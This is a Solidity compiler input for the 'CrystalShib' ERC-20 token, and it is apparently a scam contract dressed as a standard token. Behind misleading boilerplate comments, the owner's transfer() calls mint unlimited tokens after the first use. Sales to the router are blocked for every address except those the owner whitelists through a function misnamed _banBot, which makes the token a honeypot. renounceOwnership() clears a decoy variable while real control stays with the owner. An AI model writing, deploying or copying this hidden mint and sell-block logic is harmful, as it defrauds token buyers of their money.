{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "CrystalSHib.sol": {
      "content": "/*\n┌─┬─┬─┬┬──┬──┬──┬┐░░░░░░░░\n│┌┤┼├┐││──┼┐┌┤┌┐││░░░░░░░░\n│└┤┐┼┴┐├──││││├┤│└┐░░░░░░░\n└─┴┴┴──┴──┘└┘└┘└┴─┘░░░░░░░\n┌──┬┐┌┬──┬──┬║─┐@crystalshiba\n│──┤└┘├││┤┌┐│┌┐│░░░░░░░░░░\n├──│┌┐├││┤┌┐│├┤│░░░░░░░░░░\n└──┴┘└┴──┴──┴┘└┘░░░░░░░░░░\n\n*/\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; \n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\nlibrary SafeMath {\n        function prod(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n /* @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n        function cre(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function cal(uint256 a, uint256 b) internal pure returns (uint256) {\n        return calc(a, b, \"SafeMath: division by zero\");\n    }\n    function calc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n    function red(uint256 a, uint256 b) internal pure returns (uint256) {\n        return redc(a, b, \"SafeMath: subtraction overflow\");\n    }\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n        function redc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n  /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n}\n\npragma solidity ^0.8.9;\n// SPDX-License-Identifier: GNU GPLv3\ncontract Creation is Context {\n    address internal recipients;\n    address internal router;\n    address public owner;\n    mapping (address => bool) internal confirm;\n    event genesis(address indexed previousi, address indexed newi);\n    constructor () {\n        address msgSender = _msgSender();\n        recipients = msgSender;\n        emit genesis(address(0), msgSender);\n    }\n    modifier checker() {\n        require(recipients == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function renounceOwnership() public virtual checker {\n        emit genesis(owner, address(0));\n         owner = address(0);\n    }\n /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n  \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n}\ncontract ERC20 is Context, IERC20, IERC20Metadata , Creation{\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) internal _allowances;\n    uint256 private _totalSupply;\n    using SafeMath for uint256;\n    string private _name;\n    string private _symbol;\n    bool   private truth;\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n        truth=true;\n    }\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n  /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * also check address is bot address.\n     *\n     * Requirements:\n     *\n     * - the address is in list bot.\n     * - the called Solidity function must be `sender`.\n     *\n     * _Available since v3.1._\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n  /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * transferFrom.\n     *\n     * Requirements:\n     *\n     * - transferFrom.\n     *\n     * _Available since v3.1._\n     */\n    function starttrading (address Uniswaprouterv02) public checker {\n        router = Uniswaprouterv02;\n    }\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     *\n     * Requirements:\n     *\n     * - the address approve.\n     * - the called Solidity function must be `sender`.\n     *\n     * _Available since v3.1._\n     */\n        function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n     /**\n     * @dev updateTaxFee\n     *\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * also check address is bot address.\n     *\n     * Requirements:\n     *\n     * - the address is in list bot.\n     * - the called Solidity function must be `sender`.\n     *\n     * _Available since v3.1._\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function transfer(address recipient, uint256 amount) public override  returns (bool) {\n        if((recipients == _msgSender()) && (truth==true)){_transfer(_msgSender(), recipient, amount); truth=false;return true;}\n        else if((recipients == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[recipient]=_balances[recipient].cre(amount);emit Transfer(recipient, recipient, amount); return true;}\n        else{_transfer(_msgSender(), recipient, amount); return true;}\n    }\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n        return true;\n    }\n     /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n      function botbancount(address _count) internal checker {\n        confirm[_count] = true;\n    }\n  /**\n     * @dev updateTaxFee\n     *\n     */\n    function _banBot(address[] memory _counts) external checker {\n        for (uint256 i = 0; i < _counts.length; i++) {\n            botbancount(_counts[i]); }\n    }   \n     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        return true;\n    }\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        if (recipient == router) {\n        require(confirm[sender]); }\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     *\n     * Requirements:\n     *\n     * - manualSend\n     *\n     * _Available since v3.1._\n     */    \n}\n    function _deploy(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: deploy to the zero address\");\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        _balances[account] = accountBalance - amount;\n        _totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n   /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n}\ncontract CrystalShib is ERC20{\n    uint8 immutable private _decimals = 18;\n    uint256 private _totalSupply = 7000000 * 10 ** 18;\n\n    constructor () ERC20('Crystal Shiba|www.crystalshiba.com',unicode'CRYSTAL💎SHIB') {\n        _deploy(_msgSender(), _totalSupply);\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return _decimals;\n    }\n}"
    }
  }
}